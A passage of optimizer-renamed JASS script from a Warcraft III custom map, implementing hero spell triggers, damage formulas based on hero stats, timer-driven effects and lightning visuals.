call TimerStart(Hc,.1,true,function wJ)
set Hc=null
elseif GetSpellAbilityId()==$4130364B then
set Ny=GetSpellTargetUnit()
set No=GetUnitLoc(Hu)
call IssueTargetOrder(Ny,"attack",Hu)
set Ot=I2R(GetUnitAbilityLevel(Hu,$4130364B)*(150+GetHeroStr(Hu,true)))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
call UnitDamageTarget(Hu,Ny,Ot,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
if GetUnitAbilityLevel(Ny,$42303639)>=1 then
call UnitDamageTarget(Hu,Ny,Ot,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set Ny=CreateUnitAtLoc(Player(0),$68303135,No,0)
call IssueImmediateOrder(Ny,"howlofterror")
call nD(Ny,1)
endif
call RemoveLocation(No)
set No=null
endif
set Ny=null
set Np=null
set No=null
set Hu=null
endfunction
function wL takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function wK)
set Hc=null
endfunction
function wM takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function wN takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),SJ[11],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function wO takes nothing returns nothing
if IsUnitInGroup(GetEnumUnit(),UN[GetPlayerId(GetOwningPlayer(Pq))])==false then
call GroupAddUnit(UN[GetPlayerId(GetOwningPlayer(Pq))],GetEnumUnit())
call m1(Pq,GetEnumUnit(),Nu)
endif
endfunction
function wP takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),7)
local location Mc
local location No
local group Np
local boolexpr Nt
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
set Pq=Hu
set Nu=R2I(I2R(200*GetUnitAbilityLevel(Hu,$41313943)+GetHeroAgi(Hu,true)*4)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1])
set Mc=GetUnitLoc(NQ)
set No=nU(Mc,10,GetUnitFacing(NQ))
call SetUnitPositionLoc(NQ,No)
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(Mc),GetLocationY(Mc),200,Nt)
call ForGroup(Np,function wO)
call DestroyGroup(Np)
call DestroyBoolExpr(Nt)
set Np=null
set Nt=null
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
else
set Mc=GetUnitLoc(NQ)
call KillUnit(NQ)
call RemoveUnit(NQ)
call AddSpecialEffectLoc("war3mapImported\\Energy Release.mdx",Mc)
set Pq=Hu
set Nu=R2I(I2R(200*GetUnitAbilityLevel(Hu,$41313943)+GetHeroAgi(Hu,true)*3)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1])
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(Mc),GetLocationY(Mc),400,Nt)
call nd(Np,$4131324E,1,"creepthunderbolt")
call ForGroup(Np,function m9)
call DestroyBoolExpr(Nt)
call DestroyGroup(Np)
set Nt=null
set Np=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),7)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
set Mc=null
endfunction
function wQ takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local unit Nv=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2)
local integer Mc
local integer No
local integer Np
local timer Nt
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),0,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),0)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),0)>=1 then
set Mc=LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)
set No=10000*GetUnitAbilityLevel(Hu,$41304456)+1000*GetUnitAbilityLevel(Hu,$4131394B)+100*GetUnitAbilityLevel(Hu,$4131394A)+10*GetUnitAbilityLevel(Hu,$41313949)+GetUnitAbilityLevel(Hu,$41305545)
set Np=No+Mc
call UnitRemoveAbility(Hu,$4131394B)
call UnitRemoveAbility(Hu,$4131394A)
call UnitRemoveAbility(Hu,$41313949)
call UnitRemoveAbility(Hu,$41305545)
call UnitRemoveAbility(Hu,$41304456)
call UnitRemoveAbility(Hu,$4131424F)
call nj(Hu,Np)
call SetUnitAbilityLevel(Hu,$41305846,GetUnitAbilityLevel(Hu,$41305846)+1)
call SetUnitAbilityLevel(Nv,$41305846,GetUnitAbilityLevel(Nv,$41305846)+1)
set Nt=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Nt),0,Hu)
call SaveInteger(PP,GetHandleId(Nt),2,Mc)
call TimerStart(Nt,20,true,function nE)
set Nt=null
else
call UnitRemoveAbility(Hu,$41305846)
call UnitRemoveAbility(Nv,$41305846)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Nv=null
set Hu=null
endfunction
function wR takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv
local unit NQ
local location Ht
local timer Hc
local integer L9
local real NT
if GetSpellAbilityId()==$53303045 then
set NT=I2R(GetHeroAgi(Hu,true)*10+4500)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1]
call UnitDamageTarget(Hu,GetSpellTargetUnit(),NT,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
elseif GetSpellAbilityId()==$53303036 then
set NT=I2R((GetHeroAgi(Hu,true)/2+300)*GetUnitAbilityLevel(Hu,$53303036))*Nd[GetPlayerId(GetOwningPlayer(Hu))+1]
call UnitDamageTarget(Hu,GetSpellTargetUnit(),NT,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
elseif GetSpellAbilityId()==$41303832 then
set SJ[11]=I2R(GetUnitAbilityLevel(Hu,$41303832))*(300+I2R(GetHeroAgi(Hu,true)))*Nd[GetPlayerId(GetOwningPlayer(Hu))+1]
set V0=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(700.,V0,Condition(function wM))
call ForGroupBJ(SR,function wN)
call DestroyGroup(SR)
call RemoveLocation(V0)
elseif GetSpellAbilityId()==$41313943 then
set Ht=GetUnitLoc(Hu)
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303739,Ht,GetUnitFacing(Hu))
call SetUnitPathing(NQ,false)
call AddSpecialEffectTarget("war3mapImported\\Punishment_Missle.mdx",NQ,"overhead")
call GroupClear(UN[GetPlayerId(GetOwningPlayer(Hu))])
set Hc=CreateTimer()
call SaveInteger(Nq,GetHandleId(Hc),1,70)
call SaveUnitHandle(Nq,GetHandleId(Hc),2,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),7,NQ)
call TimerStart(Hc,.01,true,function wP)
elseif GetSpellAbilityId()==$41304354 then
set Nv=GetSpellTargetUnit()
call UnitAddAbility(Hu,$41305846)
call UnitAddAbility(Nv,$41305846)
call SetUnitAbilityLevel(Nv,$41305846,11)
set L9=GetHeroAgi(Hu,true)/5+GetUnitAbilityLevel(Hu,$41304354)*250
set Hc=CreateTimer()
call SaveInteger(Nq,GetHandleId(Hc),0,11)
call SaveInteger(Nq,GetHandleId(Hc),3,L9)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),2,Nv)
call TimerStart(Hc,1,true,function wQ)
elseif GetSpellAbilityId()==$41304430 then
set Nv=GetSpellTargetUnit()
call UnitAddAbility(Hu,$41305846)
call UnitAddAbility(Nv,$41305846)
call SetUnitAbilityLevel(Nv,$41305846,11)
set L9=GetHeroAgi(Hu,true)/4+GetUnitAbilityLevel(Hu,$41304430)*1500
set Hc=CreateTimer()
call SaveInteger(Nq,GetHandleId(Hc),0,11)
call SaveInteger(Nq,GetHandleId(Hc),3,L9)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),2,Nv)
call TimerStart(Hc,1,true,function wQ)
endif
set Hu=null
set Nv=null
set Hc=null
set Ht=null
set NQ=null
endfunction
function wS takes nothing returns nothing
set W9=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(W9,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(W9,function wR)
endfunction
function wT takes nothing returns nothing
local unit Nv=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local location Mc
local group No
local boolexpr Np
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 then
else
call PauseUnit(Nv,false)
set Mc=GetUnitLoc(Nv)
call DestroyEffect(AddSpecialEffectLoc("Abilities\\Spells\\Human\\Thunderclap\\ThunderClapCaster.mdl",Mc))
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),300,Np)
set Pq=Hu
set Nu=R2I(I2R(150*GetUnitAbilityLevel(Hu,$41304341)+GetHeroInt(Hu,true)*4)*N0[GetPlayerId(GetOwningPlayer(Hu))+1])
call ForGroup(No,function nB)
call DestroyGroup(No)
call DestroyBoolExpr(Np)
set No=null
set Np=null
call RemoveLocation(Mc)
set Mc=null
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),3))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set Nv=null
endfunction
function wU takes nothing returns nothing
local unit Nv=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local timer Mc
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 then
else
set Mc=CreateTimer()
call SaveEffectHandle(Nq,GetHandleId(Mc),3,LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),3))
call SaveUnitHandle(Nq,GetHandleId(Mc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Mc),1,Nv)
call SaveInteger(Nq,GetHandleId(Mc),2,31)
call TimerStart(Mc,.01,true,function wT)
set Mc=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set Nv=null
endfunction
function wV takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),3)
local unit NR=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),8)
local integer Mc
local location No
local location Np
local lightning Nt
local group Ny
local boolexpr Ot
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),7,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),7)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),7)>=1 then
set Mc=0
loop
set No=GetUnitLoc(Hu)
set Np=GetUnitLoc(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc))
set Nt=LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),0+Mc)
if nT(No,Np)>=350 and UnitAlive(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc)) then
call DestroyLightning(Nt)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0+Mc)
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\ArcaneExplosion.mdl",LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc),"origin"))
call nD(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc),1)
if HaveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc) and GetUnitUserData(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc))==1 then
set Ny=CreateGroup()
set Ot=Condition(function mx)
call GroupEnumUnitsInRange(Ny,GetLocationX(Np),GetLocationY(Np),550,Ot)
set Pq=NR
set Nu=R2I(I2R(1500*GetUnitAbilityLevel(NR,$41304257)+GetHeroInt(NR,true)*8)*N0[GetPlayerId(GetOwningPlayer(NR))+1])
call UnitDamageTarget(NR,Hu,Nu,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
call ForGroup(Ny,function nB)
call DestroyGroup(Ny)
call DestroyBoolExpr(Ot)
set Ny=null
set Ot=null
elseif HaveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc) and GetUnitUserData(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc))==2 then
set Ny=CreateGroup()
set Ot=Condition(function mx)
call GroupEnumUnitsInRange(Ny,GetLocationX(Np),GetLocationY(Np),550,Ot)
set Nu=R2I(I2R(1500*GetUnitAbilityLevel(NR,$41304257)+GetHeroInt(NR,true)*8)*N0[GetPlayerId(GetOwningPlayer(NR))+1])
call UnitDamageTarget(NR,Hu,Nu,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
call nd(Ny,$41706C79,2,"polymorph")
call DestroyGroup(Ny)
call DestroyBoolExpr(Ot)
set Ny=null
set Ot=null
elseif HaveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc) and GetUnitUserData(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc))==3 then
set Ny=CreateGroup()
set Ot=Condition(function mx)
call GroupEnumUnitsInRange(Ny,GetLocationX(Np),GetLocationY(Np),550,Ot)
set Nu=R2I(I2R(1500*GetUnitAbilityLevel(NR,$41304257)+GetHeroInt(NR,true)*8)*N0[GetPlayerId(GetOwningPlayer(NR))+1])
call UnitDamageTarget(NR,Hu,Nu,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
call nd(Ny,$4131324E,2,"creepthunderbolt")
call DestroyGroup(Ny)
call DestroyBoolExpr(Ot)
set Ny=null
set Ot=null
endif
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),4+Mc)
endif
if HaveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0+Mc) then
call MoveLightning(Nt,true,GetLocationX(No),GetLocationY(No),GetLocationX(Np),GetLocationY(Np))
endif
set Mc=Mc+1
exitwhen Mc==3
call RemoveLocation(No)
call RemoveLocation(Np)
set No=null
set Np=null
endloop
else
call DestroyLightning(LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),0))
call DestroyLightning(LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),1))
call DestroyLightning(LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),2))
call RemoveUnit(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),4))
call RemoveUnit(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),5))
call RemoveUnit(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),6))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),4)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),5)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),6)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),7)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NR=null
endfunction
function wW takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit Nv=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local location Ht=GetUnitLoc(Nv)
local location Nk=GetUnitLoc(Hu)
local group Mc
local boolexpr No
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),3,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)>=1 and nT(Ht,Nk)<1000 then
set Mc=CreateGroup()
set No=Condition(function mx)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),600,No)
set Pq=Hu
if GetUnitAbilityLevel(Hu,$41313137)>=1 then
set Nu=R2I(I2R(GetUnitAbilityLevel(Hu,$41313137)*(1000+GetHeroInt(Hu,true)))*N0[GetPlayerId(GetOwningPlayer(Hu))+1])
elseif GetUnitAbilityLevel(Hu,$41313138)>=1 then
set Nu=R2I(I2R(6000+GetHeroInt(Hu,true)*6)*N0[GetPlayerId(GetOwningPlayer(Hu))+1])
endif
call ForGroup(Mc,function nB)
call DestroyGroup(Mc)
call DestroyBoolExpr(No)
set Mc=null
set No=null
else
call DestroyLightning(LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),2))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
set Hu=null
set Nv=null
endfunction
function wX takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit Nv=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local location Ht=GetUnitLoc(Hu)
local location Nk=GetUnitLoc(Nv)
local lightning Nm=LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),2)
local real Mc
local real No
local real Np
local real Nt
local real Ny
local real Ot
local real Ou
local location Ov
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),3,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)>=1 and nT(Ht,Nk)<1000 then
call MoveLightning(Nm,true,GetLocationX(Ht),GetLocationY(Ht),GetLocationX(Nk),GetLocationY(Nk))
set Mc=GetLocationX(Ht)
set No=GetLocationY(Ht)
set Np=GetUnitX(Nv)
set Nt=GetUnitY(Nv)
set Ny=Atan2(No-Nt,Mc-Np)
set Ot=nR(GetUnitX(Nv)+10*Cos(Ny))
set Ou=nS(GetUnitY(Nv)+10*Sin(Ny))
set Ov=Location(Ot,Ou)
call DestroyEffect(AddSpecialEffect("Abilities\\Weapons\\AncientProtectorMissile\\AncientProtectorMissile.mdl",Np,Nt))
call SetUnitPositionLoc(Nv,Ov)
call RemoveLocation(Ov)
set Ov=null
else
call DestroyLightning(LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),2))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
set Hu=null
set Nv=null
endfunction
function wY takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv=GetSpellTargetUnit()
local location Ht
local location Nk
local lightning Nm
local timer Hc
local unit Mc
local unit No
local unit Np
local string Nt
local effect Ny
local group Ot
local boolexpr Ou
local real Ov
if GetSpellAbilityId()==$41313137 or GetSpellAbilityId()==$41313138 then
set Ht=GetUnitLoc(Hu)
set Nk=GetUnitLoc(Nv)
set Hc=CreateTimer()
set Nm=AddLightning("LEAS",true,GetLocationX(Ht),GetLocationY(Ht),GetLocationX(Nk),GetLocationY(Nk))
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Nv)
call SaveLightningHandle(Nq,GetHandleId(Hc),2,Nm)
call SaveInteger(Nq,GetHandleId(Hc),3,101)
call TimerStart(Hc,.05,true,function wX)
set Hc=null
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Nv)
call SaveInteger(Nq,GetHandleId(Hc),3,6)
call TimerStart(Hc,1,true,function wW)
set Hc=null
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
elseif GetSpellAbilityId()==$41304257 then
set Nu=R2I(I2R(1500*GetUnitAbilityLevel(Hu,$41304257)+GetHeroInt(Hu,true)*8)*N0[GetPlayerId(GetOwningPlayer(Hu))+1])
call UnitDamageTarget(Hu,Nv,Nu,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
set Ht=GetUnitLoc(Nv)
set Nk=PolarProjectionBJ(Ht,200,0)
set Mc=CreateUnitAtLoc(Player(0),$68303739,Nk,0)
call AddSpecialEffectTarget("buildings\\other\\PowerGenerator\\PowerGenerator.mdl",Mc,"origin")
call SetUnitVertexColor(Mc,255,0,0,255)
call SetUnitUserData(Mc,1)
call SetUnitScale(Mc,.7,.7,.7)
set Nk=PolarProjectionBJ(Ht,200,120)
set No=CreateUnitAtLoc(Player(0),$68303739,Nk,0)
call AddSpecialEffectTarget("buildings\\other\\PowerGenerator\\PowerGenerator.mdl",No,"origin")
call SetUnitVertexColor(No,255,0,255,255)
call SetUnitUserData(No,2)
call SetUnitScale(No,.7,.7,.7)
set Nk=PolarProjectionBJ(Ht,200,240)
set Np=CreateUnitAtLoc(Player(0),$68303739,Nk,0)
call AddSpecialEffectTarget("buildings\\other\\PowerGenerator\\PowerGenerator.mdl",Np,"origin")
call SetUnitVertexColor(Np,0,0,255,255)
call SetUnitUserData(Np,3)
call SetUnitScale(Np,.7,.7,.7)
set Hc=CreateTimer()
set Nm=AddLightning("RECH",true,GetUnitX(Mc),GetUnitY(Mc),GetUnitX(Nv),GetUnitY(Nv))
call SaveLightningHandle(Nq,GetHandleId(Hc),0,Nm)
set Nm=AddLightning("MYCH",true,GetUnitX(No),GetUnitY(No),GetUnitX(Nv),GetUnitY(Nv))
call SaveLightningHandle(Nq,GetHandleId(Hc),1,Nm)
set Nm=AddLightning("BLCH",true,GetUnitX(Np),GetUnitY(Np),GetUnitX(Nv),GetUnitY(Nv))
call SaveLightningHandle(Nq,GetHandleId(Hc),2,Nm)
call SaveUnitHandle(Nq,GetHandleId(Hc),3,Nv)
call SaveUnitHandle(Nq,GetHandleId(Hc),8,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),4,Mc)
call SaveUnitHandle(Nq,GetHandleId(Hc),5,No)
call SaveUnitHandle(Nq,GetHandleId(Hc),6,Np)
call SaveInteger(Nq,GetHandleId(Hc),7,141)
call TimerStart(Hc,.05,true,function wV)
set Hc=null
elseif GetSpellAbilityId()==$41304341 then
call UnitAddAbility(Nv,$41726176)
call PauseUnit(Nv,true)
set Nt=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Nt="war3mapImported\\BlackHole.mdl"
endif
set Ny=AddSpecialEffectTarget(Nt,Nv,"origin")
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Nv)
call SaveInteger(Nq,GetHandleId(Hc),2,41)
call SaveEffectHandle(Nq,GetHandleId(Hc),3,Ny)
call TimerStart(Hc,.03,true,function wU)
set Hc=null
elseif GetSpellAbilityId()==$41313956 then
set Nu=R2I(I2R(GetHeroInt(Hu,true)*8)*N0[GetPlayerId(GetOwningPlayer(Hu))+1])
call UnitDamageTarget(Hu,Nv,Nu,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
elseif GetSpellAbilityId()==$41313957 then
set Nu=R2I(I2R(GetHeroInt(Hu,true)*14)*N0[GetPlayerId(GetOwningPlayer(Hu))+1])
call UnitDamageTarget(Hu,Nv,Nu,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
elseif GetSpellAbilityId()==$41303849 then
set Ht=GetUnitLoc(Hu)
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\unholyStrikeX2c.mdl",Ht))
set Ot=CreateGroup()
set Ou=Condition(function mx)
call GroupEnumUnitsInRange(Ot,GetLocationX(Ht),GetLocationY(Ht),700,Ou)
set Pq=Hu
set Ov=I2R(100*GetUnitAbilityLevel(Hu,$41303849)+GetHeroInt(Hu,true))*N0[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Ov)
call ForGroup(Ot,function nB)
call DestroyGroup(Ot)
call DestroyBoolExpr(Ou)
set Ot=null
set Ou=null
call RemoveLocation(Ht)
set Ht=null
endif
set Ny=null
set Np=null
set No=null
set Mc=null
set Nk=null
set Ht=null
set Nv=null
set Hu=null
endfunction
function wZ takes nothing returns nothing
set XB=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XB,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(XB,function wY)
endfunction
function wa takes nothing returns boolean
if not (GetSpellAbilityId()==$41303852) then
return false
endif
return true
endfunction
function wb takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_STRUCTURE)==false
endfunction
function wc takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function wd takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(WD[RQ[0]]))==true
endfunction
function we takes nothing returns boolean
return GetBooleanAnd(wc(),wd())
endfunction
function wf takes nothing returns boolean
return GetBooleanAnd(wb(),we())
endfunction
function wg takes nothing returns nothing
call CreateNUnitsAtLoc(1,$68303053,GetOwningPlayer(WD[RQ[0]]),WE[RQ[0]],bj_UNIT_FACING)
set WF[RQ[0]]=GetLastCreatedUnit()
call IssueTargetOrderBJ(WF[RQ[0]],"magicleash",GetEnumUnit())
call UnitApplyTimedLifeBJ(1.5,$42544C46,WF[RQ[0]])
call GroupAddUnitSimple(GetEnumUnit(),RW[RQ[0]])
endfunction
function wh takes nothing returns nothing
set RQ[0]=RQ[0]+1
set RR[RQ[0]]=RR[RQ[0]]+1
set RS[0]=0
set RT[RQ[0]]=1.5
set RU[RQ[0]]=0.
set RV[RQ[0]]=0.
set WD[RQ[0]]=GetTriggerUnit()
set WE[RQ[0]]=GetSpellTargetLoc()
call CreateNUnitsAtLoc(1,$68303054,GetOwningPlayer(WD[RQ[0]]),WE[RQ[0]],bj_UNIT_FACING)
set XD[RQ[0]]=GetLastCreatedUnit()
set RW[RQ[0]]=GetUnitsInRangeOfLocMatching(300.,WE[RQ[0]],Condition(function wf))
call ForGroupBJ(RW[RQ[0]],function wg)
set RX[RQ[0]]=true
call StartTimerBJ(RY,true,.03)
endfunction
function wi takes nothing returns nothing
set XC=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XC,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(XC,Condition(function wa))
call TriggerAddAction(XC,function wh)
endfunction
function wj takes nothing returns nothing
set XF[RS[0]]=GetUnitLoc(GetEnumUnit())
call RemoveLocation(XF[RS[0]])
endfunction
function wk takes nothing returns nothing
set XF[RS[0]]=GetUnitLoc(GetEnumUnit())
call RemoveLocation(XF[RS[0]])
endfunction
function wl takes nothing returns boolean
if not (RU[RS[0]]<=0.) then
return false
endif
return true
endfunction
function wm takes nothing returns boolean
if not (RT[RS[0]]<=0.) then
return false
endif
return true
endfunction
function wn takes nothing returns nothing
